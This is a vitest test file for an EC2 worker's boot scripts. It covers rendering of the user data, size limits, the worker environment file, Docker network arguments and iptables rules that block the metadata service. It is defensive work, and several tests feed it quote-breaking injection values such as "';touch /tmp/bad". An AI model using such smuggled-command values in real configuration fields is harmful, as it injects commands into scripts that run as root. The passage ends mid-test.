import { spawnSync } from "node:child_process";
import { createHash, randomBytes, randomUUID } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gunzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import {
  AGENTX_BOOT_STAGE2_SHA256,
  EC2_USER_DATA_MAX_BYTES,
  Ec2WorkerBootConfigSchema,
  ec2WorkerBootScript,
  ec2WorkerUserData,
  type Ec2WorkerBootConfig,
} from "../../packages/contracts/src/session.js";
import { SECRET_ARN_MAX_LENGTH } from "../../packages/contracts/src/model-providers.js";

// A named environment's boot is two files (Task 10): boot.sh is user data (stage 1), boot-stage2.sh ships in the worker image. The user data
// tests render boot.sh; the tests about what the boot does read both.
const bootScript = readFileSync(new URL("../../packages/worker/ec2/boot.sh", import.meta.url), "utf8");
const stage2Script = readFileSync(new URL("../../packages/worker/ec2/boot-stage2.sh", import.meta.url), "utf8");
const bootText = `${bootScript}\n${stage2Script}`;
const qualificationScript = /cat >\/usr\/local\/libexec\/agentx-e2e-qualification <<'QUALIFICATION'\n([\s\S]*?)\nQUALIFICATION/.exec(stage2Script)?.[1] ?? "";
const workerLauncher = /cat >\/usr\/local\/libexec\/agentx-worker-start <<'LAUNCHER'\n([\s\S]*?)\nLAUNCHER/.exec(stage2Script)?.[1] ?? "";

/** The worst-case size varies by a byte or two with the random workspace ID; the check keeps this much clear of the limit so it never flips on a rerun. */
const HEADROOM_MARGIN_BYTES = 32;

const config: Ec2WorkerBootConfig = {
  workspaceId: randomUUID(),
  generation: 2,
  volumeId: "vol-0123456789abcdef0",
  expectNewVolume: false,
  workerImage: `111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/worker@sha256:${"b".repeat(64)}`,
  invokePublicKey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE+/9=",
  controlPlaneUrl: "https://abc123.execute-api.us-east-1.amazonaws.com",
  modelProvider: "amazon-bedrock",
  modelId: "arn:aws:bedrock:us-east-1:111122223333:inference-profile/us.anthropic.claude-sonnet-5-v1:0",
  promptCacheRetention: "short",
  logGroupName: "/agentx/production/worker",
};

describe("EC2 worker user data", () => {
  it("passes OpenRouter references to the container and rejects secrets or shell injection", () => {
    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/openrouter-AbCdEf";
    const rendered = ec2WorkerBootScript({ ...config, openRouterSecretArn: secretArn, openRouterProviders: "anthropic,openai" }, bootText);
    expect(rendered).toContain(`export AGENTX_OPENROUTER_SECRET_ARN='${secretArn}'`);
    expect(rendered).toContain("for name in AGENTX_OPENROUTER_SECRET_ARN AGENTX_ANTHROPIC_SECRET_ARN AGENTX_OPENAI_SECRET_ARN; do");
    expect(rendered).not.toContain("OPENROUTER_API_KEY");
    expect(() => ec2WorkerBootScript({ ...config, openRouterSecretArn: "sk-key" }, bootText)).toThrow();
    expect(() => ec2WorkerBootScript({ ...config, openRouterProviders: "anthropic';touch /tmp/bad" }, bootText)).toThrow();
  });
  it.each([["anthropicSecretArn", "AGENTX_ANTHROPIC_SECRET_ARN", "ANTHROPIC_API_KEY"], ["openaiSecretArn", "AGENTX_OPENAI_SECRET_ARN", "OPENAI_API_KEY"]] as const)(
    "passes the %s reference to the container, never a key", (field, variable, keyVariable) => {
      const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/direct-AbCdEf";
      const rendered = ec2WorkerBootScript({ ...config, [field]: secretArn }, bootText);
      expect(rendered).toContain(`export ${variable}='${secretArn}'`);
      expect(rendered).toContain(variable);
      expect(rendered).not.toContain(keyVariable);
      expect(ec2WorkerBootScript(config, bootText)).not.toContain(`export ${variable}=`);
      expect(() => ec2WorkerBootScript({ ...config, [field]: "sk-ant-api03-key" }, bootText)).toThrow();
      expect(() => ec2WorkerBootScript({ ...config, [field]: `${secretArn}';touch /tmp/bad` }, bootText)).toThrow();
    });
  // Task 14: with a model proxy the worker holds no provider secret reference; it is told where the proxy is.
  describe("with a model proxy", () => {
    const proxyUrl = "http://internal-agentx-staging-proxy-123456.us-east-1.elb.amazonaws.com:4000";
    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/direct-AbCdEf";
    const writeEnvironment = (environment: Record<string, string>) => {
      const directory = mkdtempSync(join(tmpdir(), "boot-env-"));
      const file = join(directory, "etc", "worker.env");
      const fn = /^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(stage2Script)?.[0] ?? "";
      expect(fn).not.toBe("");
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${file} MOUNT_PATH=/mnt/workspace\n${fn}\nwrite_worker_environment us-east-1`], {
        encoding: "utf8",
        env: { PATH: process.env.PATH ?? "", AGENTX_CONTROL_PLANE_URL: "https://c.test", AGENTX_MODEL_PROVIDER: "amazon-bedrock", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short",
          AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: "w", AGENTX_SESSION_GENERATION: "1", ...environment },
      });
      expect(run.status, run.stderr).toBe(0);
      return readFileSync(file, "utf8");
    };

    it("exports the proxy URL and refuses one that could break out of its quotes", () => {
      expect(ec2WorkerBootScript({ ...config, modelProxyUrl: proxyUrl }, bootScript)).toContain(`export AGENTX_MODEL_PROXY_URL='${proxyUrl}'`);
      expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_MODEL_PROXY_URL=");
      expect(() => ec2WorkerBootScript({ ...config, modelProxyUrl: `${proxyUrl}';touch /tmp/bad` }, bootScript)).toThrow();
      expect(() => ec2WorkerBootScript({ ...config, modelProxyUrl: "not a url" }, bootScript)).toThrow();
    });

    it("writes AGENTX_MODEL_PROXY_URL and no provider secret ARN line to the worker environment", () => {
      const written = writeEnvironment({ AGENTX_MODEL_PROXY_URL: proxyUrl, AGENTX_ANTHROPIC_SECRET_ARN: secretArn, AGENTX_OPENAI_SECRET_ARN: secretArn, AGENTX_OPENROUTER_SECRET_ARN: secretArn });
      expect(written).toContain(`AGENTX_MODEL_PROXY_URL=${proxyUrl}\n`);
      expect(written).not.toMatch(/_SECRET_ARN=/);
    });

    it("still writes the secret ARN lines when there is no proxy (legacy)", () => {
      const written = writeEnvironment({ AGENTX_ANTHROPIC_SECRET_ARN: secretArn });
      expect(written).toContain(`AGENTX_ANTHROPIC_SECRET_ARN=${secretArn}\n`);
      expect(written).toContain("AGENTX_OPENAI_SECRET_ARN=\n");
      expect(written).toContain("AGENTX_OPENROUTER_SECRET_ARN=\n");
      expect(written).not.toContain("AGENTX_MODEL_PROXY_URL");
    });
  });

  // R56: the task sandbox starts from the worker's own image; the worker learns it from its environment file.
  it("tells the worker its own image as the task sandbox's, in every deployment", () => {
    const image = `123456789012.dkr.ecr.us-east-1.amazonaws.com/agentx-test/worker@sha256:${"c".repeat(64)}`;
    const directory = mkdtempSync(join(tmpdir(), "boot-env-"));
    const file = join(directory, "etc", "worker.env");
    const fn = /^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(stage2Script)?.[0] ?? "";
    for (const proxy of [{}, { AGENTX_MODEL_PROXY_URL: "http://proxy.test:4000" }]) {
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${file} MOUNT_PATH=/mnt/workspace\n${fn}\nwrite_worker_environment us-east-1`], {
        encoding: "utf8",
        env: { PATH: process.env.PATH ?? "", AGENTX_CONTROL_PLANE_URL: "https://c.test", AGENTX_MODEL_PROVIDER: "amazon-bedrock", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short",
          AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: "w", AGENTX_SESSION_GENERATION: "1", AGENTX_WORKER_IMAGE: image, ...proxy },
      });
      expect(run.status, run.stderr).toBe(0);
      expect(readFileSync(file, "utf8")).toContain(`AGENTX_SANDBOX_IMAGE=${image}\n`);
      expect(readFileSync(file, "utf8")).toContain("AGENTX_RUNTIME=ec2\n");
      rmSync(file);
    }
  });

  it("passes the chosen fallback model to the container as AGENTX_MODEL_FALLBACK, never as none, and rejects anything outside its alphabet (MODEL3)", () => {
    const rendered = ec2WorkerBootScript({ ...config, modelFallback: "us.anthropic.claude-sonnet-4-6" }, bootText);
    expect(rendered).toContain("export AGENTX_MODEL_FALLBACK='us.anthropic.claude-sonnet-4-6'");
    expect(rendered).toContain("AGENTX_MODEL_FALLBACK=${AGENTX_MODEL_FALLBACK:-}");
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_MODEL_FALLBACK=");
    for (const bad of ["none", "us.anthropic.claude';touch /tmp/bad", "x".repeat(81), "has space", ""]) expect(() => ec2WorkerBootScript({ ...config, modelFallback: bad }, bootScript), bad).toThrow();
  });
  it("prepends every boot value to the script as a quoted export", () => {
    const userData = ec2WorkerBootScript(config, bootScript);
    expect(userData.startsWith("#!/bin/bash\n")).toBe(true);
    // Only this script's own shebang: the worker launcher it writes lives in stage 2, in the worker image.
    expect(userData.match(/^#!/gm)).toHaveLength(1);
    expect(userData).not.toContain("<<'LAUNCHER'");
    expect(userData).toContain(`export AGENTX_WORKSPACE_ID='${config.workspaceId}'`);
    expect(userData).toContain("export AGENTX_SESSION_GENERATION='2'");
    expect(userData).toContain("export AGENTX_EXPECT_NEW_VOLUME='false'");
    expect(userData).toContain(`export AGENTX_MODEL_ID='${config.modelId}'`);
    expect(userData).toContain("export PI_CACHE_RETENTION='short'");
    expect(userData.endsWith("main \"$@\"\n")).toBe(true);
  });

  it("sends the boot script as base64 gzip user data that cloud-init unpacks to exactly that script (#229)", () => {
    const encoded = ec2WorkerUserData(config, bootScript);
    expect(encoded).toMatch(/^[A-Za-z0-9+/]+={0,2}$/);
    const raw = Buffer.from(encoded, "base64");
    // cloud-init recognizes gzip user data by its magic bytes and decompresses it before running it.
    expect([...raw.subarray(0, 2)]).toEqual([0x1f, 0x8b]);
    expect(gunzipSync(raw).toString("utf8")).toBe(ec2WorkerBootScript(config, bootScript));
  });

  it("leaves real headroom under EC2's 16 KB user data limit with every value at its maximum (#223, #229)", () => {
    // Letters and digits that barely compress, so this is the largest user data the schema admits. They come from a fixed hash stream, not
    // from randomness: the size below must be the same on every run, so the margin it is checked against is a number and not a probability.
    let counter = 0;
    const stream = (length: number) => {
      const bytes: number[] = [];
      while (bytes.length < length) bytes.push(...createHash("sha256").update(`headroom-${counter++}`).digest());
      return bytes.slice(0, length);
    };
    const noise = (length: number) => {
      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      return stream(length).map((byte) => alphabet[byte % alphabet.length]).join("");
    };
    const lower = (length: number) => noise(length).toLowerCase();
    const secretPrefix = "arn:aws:secretsmanager:us-east-1:123456789012:secret:";
    // A named environment's worker: stage 2 ships in its image, so the user data carries boot.sh and the stage 2 hash alone.
    const worstCase = Ec2WorkerBootConfigSchema.parse({
      ...config,
      environmentKind: "named",
      bootStage2Sha256: [...randomBytes(32)].map((byte) => byte.toString(16).padStart(2, "0")).join(""),
      modelProxyUrl: `https://${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(56)}`,
      generation: Number.MAX_SAFE_INTEGER,
      invokePublicKey: noise(1_024),
      controlPlaneUrl: `https://${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(56)}`,
      modelProvider: noise(128),
      modelId: noise(256),
      openRouterSecretArn: `${secretPrefix}${noise(2_048 - secretPrefix.length)}`,
      openRouterProviders: [...Array.from({ length: 6 }, () => lower(80)), lower(26)].join(","),
      anthropicSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      openaiSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      logGroupName: `/${noise(511)}`,
      executorImage: `111122223333.dkr.ecr.us-east-1.amazonaws.com/${lower(120)}@sha256:${"e".repeat(64)}`,
      // Test 43 (MODEL3): the new variable at its longest, with every other value at its maximum too.
      modelFallback: noise(80),
    });
    expect(worstCase.modelFallback).toHaveLength(80);
    expect(worstCase.controlPlaneUrl).toHaveLength(512);
    expect(worstCase.modelProxyUrl).toHaveLength(512);
    expect(worstCase.openRouterProviders).toHaveLength(512);
    expect(worstCase.anthropicSecretArn).toHaveLength(SECRET_ARN_MAX_LENGTH);
    const compressed = Buffer.from(ec2WorkerUserData(worstCase, bootScript), "base64").length;
    // EC2 measures user data before base64 encoding. Moving the long tail of the boot into the worker image (Task 10) freed about 3.5 KB
    // compressed: the same values leave 1,654 bytes with the legacy single-file boot (boot-legacy.sh) and about 4.5 KB with boot.sh.
    // This case sets every value at its maximum at once (a named environment's maximal model proxy URL and stage 2 hash, and MODEL3's 80-character
    // fallback model), which no real worker's configuration does; its letters come from a fixed hash stream, so the size is the same on every run
    // (about 4.5 KB free at the merge of mainline 46973735, which added the kernel pin and the fallback variable). At least 4 KB (plus the margin) stay free for boot changes.
    expect(compressed).toBeLessThanOrEqual(EC2_USER_DATA_MAX_BYTES - 4_096 - HEADROOM_MARGIN_BYTES);
  });

  it("measures the limit on the compressed user data, not the script (#229)", () => {
    const longScript = `${bootScript}${"#".repeat(EC2_USER_DATA_MAX_BYTES)}\n`;
    expect(Buffer.byteLength(ec2WorkerBootScript(config, longScript))).toBeGreaterThan(EC2_USER_DATA_MAX_BYTES);
    expect(Buffer.from(ec2WorkerUserData(config, longScript), "base64").length).toBeLessThan(EC2_USER_DATA_MAX_BYTES);
  });

  it("refuses to render user data EC2 would reject for its size (#223)", () => {
    // Random bytes do not compress, so this pushes the compressed user data past the limit.
    const incompressible = `${bootScript}# ${randomBytes(EC2_USER_DATA_MAX_BYTES).toString("base64")}\n`;
    expect(() => ec2WorkerUserData(config, incompressible)).toThrow(/worker user data is \d+ bytes compressed; EC2 allows less than 16384/);
  });

  it("exports AGENTX_ENVIRONMENT_KIND only for a named environment, and refuses any other value", () => {
    expect(ec2WorkerBootScript({ ...config, environmentKind: "named", bootStage2Sha256: "ab".repeat(32) }, bootScript)).toContain("export AGENTX_ENVIRONMENT_KIND='named'");
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_ENVIRONMENT_KIND=");
    expect(() => ec2WorkerBootScript({ ...config, environmentKind: "legacy" as "named" }, bootScript)).toThrow();
  });

  it("exports exactly the variables the boot script requires", () => {
    const required = /for name in ([\s\S]*?); do/.exec(bootScript)?.[1]?.split(/[\s\\]+/).filter(Boolean) ?? [];
    const exported = [...ec2WorkerBootScript(config, bootScript).matchAll(/^export (\w+)=/gm)].map((match) => match[1]);
    expect(required.length).toBeGreaterThan(0);
    expect(exported.sort()).toEqual(required.sort());
  });

  it("gives the worker the host's Docker and keeps Docker's data on the workspace volume (#121)", () => {
    expect(bootText).toContain("readonly DOCKER_DATA_ROOT=$MOUNT_PATH/.docker");
    expect(bootText).toContain(`printf '{"data-root": "%s"}\\n' "$DOCKER_DATA_ROOT" >/etc/docker/daemon.json`);
    // The daemon starts only after the workspace is mounted, so its data root is on the volume.
    expect(bootText.indexOf("mount_workspace \"$device\"")).toBeLessThan(bootText.indexOf("  ensure_docker\n"));
    expect(workerLauncher).toContain('args=(run --rm --name "$WORKER_CONTAINER" "${network_args[@]}" --env-file "$WORKER_ENV_FILE" --volume "$MOUNT_PATH:$MOUNT_PATH")');
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootText).toContain("ExecStart=/usr/local/libexec/agentx-worker-start");
    expect(bootText).toContain("RequiresMountsFor=$MOUNT_PATH");
  });

  // Task 25 Part B (F2): the worker leaves the host network, and the instance metadata service is closed to containers and
  // to every non-root process on the host.
  describe("the worker's network and the instance metadata service (R56, F2)", () => {
    const launcherFunction = (name: string) => new RegExp(`^${name}\\(\\) \\{[\\s\\S]*?^\\}$`, "m").exec(workerLauncher)?.[0] ?? "";
    const withEnvironment = (lines: string[]) => {
      const directory = mkdtempSync(join(tmpdir(), "launcher-"));
      const envFile = join(directory, "worker.env");
      writeFileSync(envFile, `${lines.join("\n")}\n`);
      return { directory, envFile };
    };
    const NAMED = ["AGENTX_MODEL_PROVIDER=amazon-bedrock", "AGENTX_ENVIRONMENT_KIND=named", "AGENTX_MODEL_PROXY_URL=http://proxy.test:4000"];
    const LEGACY = ["AGENTX_MODEL_PROVIDER=amazon-bedrock", "AGENTX_ANTHROPIC_SECRET_ARN=", "AGENTX_OPENAI_SECRET_ARN="];

    const networkArgs = (lines: string[]) => {
      const { envFile } = withEnvironment(lines);
      const functions = ["named_environment", "worker_network_args"].map(launcherFunction).join("\n");
      expect(functions).toContain("worker_network_args()");
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${envFile}\n${functions}\nworker_network_args`], { encoding: "utf8" });
      expect(run.status, run.stderr).toBe(0);
      return run.stdout.split("\n").filter(Boolean);
    };

    it("starts a named environment's worker on a bridge network that publishes only its port, never on the host network", () => {
      expect(networkArgs(NAMED)).toEqual(["--network", "bridge", "--publish", "8080:8080"]);
      expect(networkArgs(NAMED)).not.toContain("host");
    });

    it("leaves the legacy deployment's worker on the host network, where its Bedrock calls need the instance role", () => {
      expect(networkArgs(LEGACY)).toEqual(["--network", "host"]);
      expect(networkArgs(["AGENTX_MODEL_PROXY_URL="])).toEqual(["--network", "host"]);
    });

    it("tells a named environment by an explicit marker, not by whether a proxy URL is present", () => {
      // A named environment that lost its proxy URL is still named: bridge, never the host network.
      expect(networkArgs(["AGENTX_ENVIRONMENT_KIND=named"])).toEqual(["--network", "bridge", "--publish", "8080:8080"]);
      // A proxy URL alone does not make a legacy launch named.
      expect(networkArgs(["AGENTX_MODEL_PROXY_URL=http://proxy.test:4000"])).toEqual(["--network", "host"]);
    });

    it("refuses to start a named worker that has no model proxy URL", () => {
      const check = (lines: string[]) => {
        const { envFile } = withEnvironment(lines);
        const functions = ["named_environment", "require_model_proxy"].map(launcherFunction).join("\n");
        expect(functions).toContain("require_model_proxy()");
        return spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${envFile}\n${functions}\nrequire_model_proxy`], { encoding: "utf8" }).status;
      };
      expect(check(["AGENTX_ENVIRONMENT_KIND=named"])).not.toBe(0);
      expect(check(["AGENTX_ENVIRONMENT_KIND=named", "AGENTX_MODEL_PROXY_URL="])).not.toBe(0);
      expect(check(NAMED)).toBe(0);
      expect(check(LEGACY)).toBe(0);
      expect(workerLauncher).toContain("require_model_proxy || {");
    });

    it("writes the marker to worker.env only for a named environment", () => {
      const written = (kind?: string) => {
        const directory = mkdtempSync(join(tmpdir(), "boot-env-"));
        const file = join(directory, "etc", "worker.env");
        const fn = /^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(stage2Script)?.[0] ?? "";
        const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${file} MOUNT_PATH=/mnt/workspace\n${fn}\nwrite_worker_environment us-east-1`], {
          encoding: "utf8",
          env: { PATH: process.env.PATH ?? "", AGENTX_CONTROL_PLANE_URL: "https://c.test", AGENTX_MODEL_PROVIDER: "amazon-bedrock", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short",
            AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: "w", AGENTX_SESSION_GENERATION: "1", AGENTX_WORKER_IMAGE: "image", ...(kind === undefined ? {} : { AGENTX_ENVIRONMENT_KIND: kind }) },
        });
        expect(run.status, run.stderr).toBe(0);
        return readFileSync(file, "utf8");
      };
      expect(written("named")).toContain("AGENTX_ENVIRONMENT_KIND=named\n");
      expect(written()).not.toContain("export AGENTX_ENVIRONMENT_KIND=");
    });

    it("never says --network host outside the legacy branch", () => {
      const named = launcherFunction("worker_network_args").replace(/else[\s\S]*?fi/u, "fi");
      expect(named).not.toContain("host");
      expect(workerLauncher.match(/--network host/gu)).toHaveLength(1);
    });

    /**
     * Runs block_imds (once or more) against a stateful iptables shim: `rules` is the chain contents, top first (-I puts a rule on top, -D removes the first exact match, -C answers by exact match), and every call is logged.
     * `failInsert` is a regular expression: an -I whose rule text matches it fails (a kernel without the module). modprobe is a shim too (never the real one), and the state file is a temporary one.
     */
    const runBlock = (lines: string[], options: { existing?: string[]; failInsert?: RegExp; failModprobe?: boolean; times?: number; directory?: string } = {}) => {
      const made = withEnvironment(lines);
      const directory = options.directory ?? made.directory;
      const envFile = join(directory, "worker.env");
      const log = join(directory, "iptables.log");
      const rulesFile = join(directory, "rules");
      const stateFile = join(directory, "setup-isolation");
      if (options.existing !== undefined) writeFileSync(rulesFile, options.existing.map((rule) => `${rule}\n`).join(""));
      if (options.failInsert !== undefined) writeFileSync(join(directory, "fail-insert"), options.failInsert.source);
      writeFileSync(join(directory, "iptables"), `#!/bin/bash
echo "$*" >> ${log}
touch ${rulesFile}
op=$1; shift
case "$op" in
  -C) grep -qxF -- "$*" ${rulesFile}; exit $?;;
  -I) ${options.failInsert === undefined ? "" : `re=$(cat ${directory}/fail-insert); if [[ "$*" =~ $re ]]; then exit 1; fi`}
      { printf '%s\\n' "$*"; cat ${rulesFile}; } > ${rulesFile}.new && mv ${rulesFile}.new ${rulesFile}; exit 0;;
  -D) line=$(grep -nxF -- "$*" ${rulesFile} | head -n1 | cut -d: -f1); [[ -n "$line" ]] || exit 1; sed "$line"d ${rulesFile} > ${rulesFile}.new && mv ${rulesFile}.new ${rulesFile}; exit 0;;
  *) exit 1;;
esac
`, { mode: 0o755 });
      writeFileSync(join(directory, "modprobe"), `#!/bin/bash\necho "$*" >> ${join(directory, "modprobe.log")}\n${options.failModprobe === true ? "exit 1" : "exit 0"}\n`, { mode: 0o755 });
      const functions = ["named_environment", "block_imds", "setup_isolation_state"].map(launcherFunction).join("\n");
      expect(functions).toContain("block_imds()");
      const calls = Array.from({ length: options.times ?? 1 }, () => "block_imds; echo \"status=$?\"").join("\n");
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${envFile}\nPATH=${directory}:$PATH\nexport SETUP_ISOLATION_FILE=${stateFile}\n${functions}\n${calls}`], { encoding: "utf8" });
      const read = (path: string) => { try { return readFileSync(path, "utf8").split("\n").filter(Boolean); } catch { return []; } };
      return { run, statuses: [...run.stdout.matchAll(/status=(\d+)/gu)].map((match) => Number(match[1])), calls: read(log), rules: read(rulesFile), state: read(stateFile), modprobe: read(join(directory, "modprobe.log")), directory, stateFile };
    };
    const blockImds = (lines: string[], existing: string[] = []) => {
      const result = runBlock(lines, { existing });
      expect(result.run.status, result.run.stderr).toBe(0);
      return result.calls;
    };
    const DOCKER_USER = "DOCKER-USER -d 169.254.169.254/32 -j REJECT";
    const OUTPUT = "OUTPUT -d 169.254.169.254/32 -m owner ! --uid-owner 0 -j REJECT";
    // A setup run's network (host interface rvbs<slot>) may reach its helper's port 53 and nothing else of 172.29.0.0/16 (the firewall unit walls every rvb* bridge).
    // The helper's reply comes back inside the same bridge from port 53 (with br_netfilter, -i and -o are both the bridge): the 172.16/12 drop would drop it, so established connections return first; and the helper's
    // port is open only for traffic that stays inside ONE bridge (physdev), so one run's sandbox cannot reach another run's helper.
    const ESTABLISHED = "DOCKER-USER -i rvbs+ -o rvbs+ -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN";
    const HELPER_UDP = "DOCKER-USER -i rvbs+ -o rvbs+ -m physdev --physdev-is-bridged -d 172.29.0.0/16 -p udp --dport 53 -j RETURN";
    // The firewall unit's "VPC DNS stays open" RETURN rules match -i rvb+, so they match rvbs+ too: without these a sandbox could ask the VPC resolver itself and skip the helper. The sandbox is 172.29.<slot>.3.
    const NO_RESOLVER_UDP = "DOCKER-USER -i rvbs+ -s 172.29.0.3/255.255.0.255 -p udp --dport 53 ! -o rvbs+ -j DROP";
    const NO_RESOLVER_TCP = "DOCKER-USER -i rvbs+ -s 172.29.0.3/255.255.0.255 -p tcp --dport 53 ! -o rvbs+ -j DROP";
    const HELPER_TCP = "DOCKER-USER -i rvbs+ -o rvbs+ -m physdev --physdev-is-bridged -d 172.29.0.0/16 -p tcp --dport 53 -j RETURN";
    const SETUP_RULES_LIST = [ESTABLISHED, HELPER_UDP, HELPER_TCP, NO_RESOLVER_UDP, NO_RESOLVER_TCP];

    it("rejects 169.254.169.254 for bridged containers and for every non-root process on the host, in a named environment", () => {
      // First it looks (metadata rule, then the five), then inserts each missing rule in this order, the metadata rejections last so they are on top.
      expect(blockImds(NAMED)).toEqual([`-C ${DOCKER_USER}`, ...[ESTABLISHED, HELPER_UDP, HELPER_TCP, NO_RESOLVER_UDP, NO_RESOLVER_TCP].map((rule) => `-C ${rule}`), `-C ${ESTABLISHED}`, `-I ${ESTABLISHED}`, `-C ${HELPER_UDP}`, `-I ${HELPER_UDP}`, `-C ${HELPER_TCP}`, `-I ${HELPER_TCP}`, `-C ${NO_RESOLVER_UDP}`, `-I ${NO_RESOLVER_UDP}`, `-C ${NO_RESOLVER_TCP}`, `-I ${NO_RESOLVER_TCP}`, `-C ${DOCKER_USER}`, `-I ${DOCKER_USER}`, `-C ${OUTPUT}`, `-I ${OUTPUT}`]);
      // Port 53 of the helper's range only, between setup bridges only, after nothing that could open more: the helper rules are the only RETURN rules and the metadata rejection is inserted after them (so it is above them).
      const rules = blockImds(NAMED).filter((line) => line.startsWith("-I "));
      expect(rules.filter((line) => line.includes("RETURN")).every((line) => line.includes("-i rvbs+ -o rvbs+ ") && (line.includes("--ctstate ESTABLISHED,RELATED") || (line.includes("--physdev-is-bridged") && line.includes("-d 172.29.0.0/16") && line.includes("--dport 53"))))).toBe(true);
      // The helper's port is never open without the same-bridge match.
      expect(rules.filter((line) => line.includes("--dport 53") && line.includes("RETURN")).every((line) => line.includes("--physdev-is-bridged"))).toBe(true);
      // A sandbox's own port-53 traffic that leaves its bridge is dropped (it must not reach the VPC resolver itself), for udp and tcp, and nothing else is dropped by those rules.
      expect(rules.filter((line) => line.includes("-j DROP"))).toEqual([`-I ${NO_RESOLVER_UDP}`, `-I ${NO_RESOLVER_TCP}`]);
      expect(rules.findIndex((line) => line === `-I ${DOCKER_USER}`)).toBeGreaterThan(rules.findIndex((line) => line === `-I ${HELPER_TCP}`));
    });

    it("adds each rule once: nothing is inserted when it is already there (the launcher runs on every restart)", () => {
      const looks = [`-C ${DOCKER_USER}`, ...SETUP_RULES_LIST.map((rule) => `-C ${rule}`)];
      expect(blockImds(NAMED, [...SETUP_RULES_LIST, DOCKER_USER, OUTPUT])).toEqual([...looks, `-C ${DOCKER_USER}`, `-C ${OUTPUT}`]);
      expect(blockImds(NAMED, [...SETUP_RULES_LIST, DOCKER_USER])).toEqual([...looks, `-C ${DOCKER_USER}`, `-C ${OUTPUT}`, `-I ${OUTPUT}`]);
    });

    const SETUP_RULES = [ESTABLISHED, HELPER_UDP, HELPER_TCP, NO_RESOLVER_UDP, NO_RESOLVER_TCP];

    it("in the fully successful case leaves the chain in the order the post-check expects, and tells the worker the setup rules are ready", () => {
      const result = runBlock(NAMED);
      expect(result.statuses).toEqual([0]);
      // Top of DOCKER-USER first: the metadata rejection, the two port-53 drops, the two port-53 returns, the conntrack return.
      expect(result.rules.filter((rule) => rule.startsWith("DOCKER-USER "))).toEqual([DOCKER_USER, NO_RESOLVER_TCP, NO_RESOLVER_UDP, HELPER_TCP, HELPER_UDP, ESTABLISHED]);
      expect(result.rules).toContain(OUTPUT);
      expect(result.calls.some((call) => call.startsWith("-D "))).toBe(false);
      expect(result.state).toEqual(["ready"]);
    });

    it("loads br_netfilter, xt_conntrack and xt_physdev first, and a module that will not load is not fatal", () => {
      const result = runBlock(NAMED, { failModprobe: true });
      expect(result.modprobe).toEqual(["br_netfilter", "xt_conntrack", "xt_physdev"]);
      expect(result.statuses).toEqual([0]);
      expect(result.run.stderr).toContain("module xt_physdev could not be loaded (not fatal)");
      // The modules are tried before the first rule is.
      expect(workerLauncher.indexOf("modprobe")).toBeLessThan(workerLauncher.indexOf("iptables -C"));
    });

    it("xt_physdev missing: the physdev rules fail, the rvbs+ rules that went in are deleted by their exact text, both metadata rules stay in place on top, and the worker still starts (setup refused)", () => {
      const result = runBlock(NAMED, { failInsert: /physdev/ });
      expect(result.statuses).toEqual([0]);
      expect(result.run.status, result.run.stderr).toBe(0);
      // Nothing of the five is left: no half-applied set.
      expect(result.rules.filter((rule) => rule.includes("rvbs+"))).toEqual([]);
      expect(result.rules.filter((rule) => rule.startsWith("DOCKER-USER "))).toEqual([DOCKER_USER]);
      expect(result.rules).toContain(OUTPUT);
      // Deleted by exact rule text only (never by position, never a flush): the one rule that went in before the failure, and not a metadata rule.
      expect(result.calls.filter((call) => /^-(?:D|F|X|Z|R)\b/u.test(call))).toEqual([`-D ${ESTABLISHED}`]);
      expect(result.calls.some((call) => /^-D DOCKER-USER \d/u.test(call) || call.startsWith("-F"))).toBe(false);
      expect(result.calls.filter((call) => call.startsWith("-I ") && call.includes("169.254.169.254"))).toEqual([`-I ${DOCKER_USER}`, `-I ${OUTPUT}`]);
      expect(result.state).toEqual(["unavailable"]);
      expect(result.run.stderr).toContain("setup isolation UNAVAILABLE on this worker");
    });

    it("any one of the five failing withdraws all of them, whichever it is, and never touches the metadata rules", () => {
      for (const failing of SETUP_RULES) {
        const spec = failing.replace(/[.*+?^${}()|[\]\\]/gu, "\\$&");
